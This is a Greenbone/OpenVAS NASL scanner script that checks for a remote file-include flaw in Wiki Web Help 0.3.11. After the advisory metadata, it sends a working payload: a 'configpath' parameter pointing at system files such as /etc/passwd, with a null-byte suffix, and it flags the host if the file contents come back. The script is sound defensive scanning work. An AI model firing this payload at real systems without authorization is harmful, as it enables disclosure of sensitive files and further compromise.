CPE = "cpe:/a:wikiwebhelp:wiki_web_help";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103562" );
	script_bugtraq_id( 55387 );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "Wiki Web Help 'configpath' Parameter Remote File Include Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/55387" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-09-10 11:39:24 +0200 (Mon, 10 Sep 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "gb_wwh_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "WWH/installed" );
	script_tag( name: "summary", value: "Wiki Web Help is prone to a remote file-include vulnerability because
it fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "Exploiting this issue could allow an attacker to compromise the
application and the underlying system. Other attacks are also possible." );
	script_tag( name: "affected", value: "Wiki Web Help 0.3.11 is vulnerable. Other versions may also be
affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/pages/links.php?configpath=/" + files[file] + "%00";
	if(http_vuln_check( port: port, url: url, pattern: file )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 0 );

